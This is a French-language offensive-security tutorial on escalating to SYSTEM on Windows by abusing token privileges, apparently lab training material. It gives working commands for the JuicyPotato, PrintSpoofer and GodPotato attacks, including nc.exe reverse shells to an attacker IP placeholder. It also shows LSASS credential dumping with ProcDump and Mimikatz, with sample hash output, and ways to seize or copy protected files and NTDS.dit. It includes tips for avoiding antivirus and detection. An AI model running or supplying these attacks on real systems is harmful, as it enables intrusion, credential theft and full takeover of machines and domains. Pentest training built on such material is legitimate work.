# Privileges utilisateur Windows

Le modele de securite Windows repose sur des privileges granulaires attribues aux tokens d'acces. Certains de ces privileges, lorsqu'ils sont accordes a un compte compromis, permettent une escalade directe vers SYSTEM. Les plus critiques sont SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege et SeBackupPrivilege.

## Pourquoi

Les comptes de service (IIS, MSSQL, services d'impression) recoivent frequemment des privileges eleves pour fonctionner correctement. Quand on compromet un tel compte, par exemple via une injection SQL avec `xp_cmdshell` ou un webshell sur IIS, on herite de ses privileges. Savoir les identifier et les exploiter transforme un acces limite en controle total du systeme.

## Comment ca marche

### Modele de privileges Windows

Windows distingue les droits (logon rights) des privileges. Les droits definissent comment un utilisateur peut se connecter (localement, via le reseau, en tant que service). Les privileges definissent ce qu'il peut faire une fois connecte.

| Privilege | Description | Impact |
|---|---|---|
| **SeImpersonatePrivilege** | Permet d'usurper l'identite d'un client apres authentification | Escalade vers SYSTEM via les attaques Potato |
| **SeAssignPrimaryTokenPrivilege** | Permet d'assigner un token primaire a un processus | Souvent couple avec SeImpersonate |
| **SeDebugPrivilege** | Permet d'acceder a la memoire de n'importe quel processus | Dump de LSASS, injection dans des processus SYSTEM |
| **SeTakeOwnershipPrivilege** | Permet de prendre possession de tout objet securisable | Acces a des fichiers proteges, cles de registre |
| **SeBackupPrivilege** | Permet de lire tout fichier en ignorant les ACL | Copie de SAM, NTDS.dit, fichiers proteges |
| **SeRestorePrivilege** | Permet d'ecrire tout fichier en ignorant les ACL | Remplacement de binaires systeme |
| **SeLoadDriverPrivilege** | Permet de charger des drivers noyau | Chargement de drivers vulnerables (Capcom.sys) |

{% hint style="info" %}
Pour voir les privileges du token courant : `whoami /priv`. Un privilege en etat "Disabled" n'est pas inutilisable. Il peut etre active programmatiquement si le token le contient.
{% endhint %}

### SeImpersonatePrivilege

Ce privilege permet de creer un processus dans le contexte de securite d'un autre utilisateur. Les attaques de type "Potato" exploitent ce mecanisme en forcant le compte SYSTEM a s'authentifier sur un service controle par l'attaquant, puis en usurpant son token.

| Variante | Cible | Methode |
|---|---|---|
| **JuicyPotato** | Windows Server 2016/2019, Windows 10 (< 1809) | Abus du service COM via DCOM |
| **PrintSpoofer** | Windows 10/Server 2019+ | Abus du service Spooler via named pipe |
| **RoguePotato** | Toutes versions recentes | Relai OXID resolver |
| **GodPotato** | Toutes versions | Variante moderne, large compatibilite |

### SeDebugPrivilege

Ce privilege donne un acces complet a la memoire de tous les processus du systeme. L'exploitation classique consiste a dumper la memoire du processus `lsass.exe` (Local Security Authority Subsystem Service) qui contient les credentials en cache.

### SeTakeOwnershipPrivilege

Ce privilege permet de prendre possession de tout objet securisable sans avoir besoin des permissions existantes. On peut cibler des fichiers systeme, des cles de registre ou des services pour modifier leur configuration.

### SeBackupPrivilege

Ce privilege permet de lire tout fichier du systeme en ignorant les ACL. Sur un controleur de domaine, cela donne acces a `NTDS.dit` et a la base SAM. L'exploitation necessite l'utilisation de fonctions specifiques avec le flag `FILE_FLAG_BACKUP_SEMANTICS`.

## En pratique

### SeImpersonate avec JuicyPotato

```powershell
# - Verifier la presence du privilege
whoami /priv
# SeImpersonatePrivilege  Impersonate a client after authentication  Enabled

# - Scenario typique : shell via MSSQL xp_cmdshell
# Le compte de service SQL possede SeImpersonate

# - Utiliser JuicyPotato pour obtenir un shell SYSTEM
.\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe <IP_ATTAQUANT> 8443 -e cmd.exe" -t *

# -l : port d'ecoute local
# -p : programme a executer
# -t : type de creation de processus (* = essayer les deux)
```

{% tabs %}
{% tab title="PrintSpoofer" %}
```powershell
# - Alternative pour les systemes recents (Windows 10 1809+)
.\PrintSpoofer.exe -i -c cmd

# Resultat :
# [+] Found privilege: SeImpersonatePrivilege
# [+] Named pipe listening...
# [+] CreateProcessAsUser() OK
# Microsoft Windows [Version 10.0.19041]
# C:\Windows\system32> whoami
# nt authority\system
```
{% endtab %}
{% tab title="GodPotato" %}
```powershell
# - Variante moderne, compatible avec un large spectre de versions
.\GodPotato.exe -cmd "cmd /c whoami"
# [*] CombaseDisableThreadLibraryCalls OK
# [*] Trigger RPCSS OK
# nt authority\system

.\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe <IP_ATTAQUANT> 443 -e cmd.exe"
```
{% endtab %}
{% endtabs %}

### SeDebugPrivilege : dump de LSASS

{% tabs %}
{% tab title="ProcDump (Sysinternals)" %}
```powershell
# - Dumper la memoire de LSASS avec ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# - Transferer le dump sur la machine attaquante
# - Extraire les credentials avec Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords

# Resultat typique :
# Authentication Id : 0 ; 156893
# User Name         : Administrator
# Domain            : INLANEFREIGHT
# NTLM              : cf3a5525ee9414229e66279623ed5c58
```
{% endtab %}
{% tab title="Mimikatz direct" %}
```powershell
# - Si Mimikatz peut tourner directement sur la cible
mimikatz.exe
privilege::debug
sekurlsa::logonPasswords

# SeDebugPrivilege doit etre present dans le token
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
ProcDump est signe par Microsoft (Sysinternals), ce qui le rend moins detecte par les antivirus que Mimikatz. C'est souvent la methode preferee pour dumper LSASS en environnement surveille.
{% endhint %}

### SeTakeOwnershipPrivilege

```powershell
# - Verifier le privilege
whoami /priv | findstr "SeTakeOwnership"
# SeTakeOwnershipPrivilege    Take ownership of files    Disabled

# - Activer le privilege (via script PowerShell ou outil)
# Utiliser Enable-Privilege.ps1 ou un outil equivalent

# - Prendre possession d'un fichier protege
takeown /f C:\Department Shares\Private\IT\cred.txt

# - Modifier les ACL pour pouvoir lire le fichier
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F

# - Lire le contenu
type "C:\Department Shares\Private\IT\cred.txt"
```

### SeBackupPrivilege

```powershell
# - Importer les modules PoC
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# - Activer le privilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
# SeBackupPrivilege is enabled

# - Copier un fichier protege
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# - Sur un DC, copier NTDS.dit via diskshadow
# (necessite SeBackupPrivilege + acces au DC)
```

{% hint style="success" %}
SeBackupPrivilege sur un controleur de domaine est equivalent a Domain Admin. On peut extraire la totalite de la base Active Directory via `NTDS.dit` et la cle de registre SYSTEM.
{% endhint %}

## Pieges et galeres

- **JuicyPotato et Windows Server 2019** : JuicyPotato ne fonctionne plus sur Server 2019 et Windows 10 1809+. Utiliser PrintSpoofer ou GodPotato a la place
- **CLSID** : JuicyPotato necessite un CLSID valide pour la version de l'OS cible. Des listes de CLSID sont disponibles en ligne
- **Privilege Disabled vs Absent** : un privilege en etat "Disabled" peut etre active. Un privilege absent du token ne peut pas etre ajoute sans relancer le processus
- **LSASS protege** : Windows Credential Guard et PPL (Protected Process Light) empechent le dump direct de LSASS. Des techniques de bypass existent mais sont plus complexes
- **Detection** : le dump de LSASS genere des evenements de securite (4688, Sysmon Event ID 10). En environnement surveille, privilegier l'approche offline (copie du dump puis extraction sur la machine attaquante)
- **UAC** : certains privileges ne sont disponibles que dans un contexte eleve. Si le token non eleve ne montre pas le privilege, il faut d'abord contourner l'UAC

## Memo express

| Commande | Usage |
|---|---|
| `whoami /priv` | Lister les privileges du token courant |
| `.\JuicyPotato.exe -l <port> -p <cmd> -t *` | Escalade via SeImpersonate (< Server 2019) |
| `.\PrintSpoofer.exe -i -c cmd` | Escalade via SeImpersonate (Server 2019+) |
| `.\GodPotato.exe -cmd "cmd /c <cmd>"` | Escalade via SeImpersonate (toutes versions) |
| `procdump.exe -ma lsass.exe lsass.dmp` | Dump memoire LSASS (SeDebug) |
| `sekurlsa::logonPasswords` | Extraction des credentials depuis un dump |
| `takeown /f <fichier>` | Prise de possession (SeTakeOwnership) |
| `icacls <fichier> /grant <user>:F` | Attribution de permissions apres takeown |
| `Set-SeBackupPrivilege` | Activation de SeBackupPrivilege |
| `Copy-FileSeBackupPrivilege <src> <dst>` | Copie de fichier protege (SeBackup) |

***
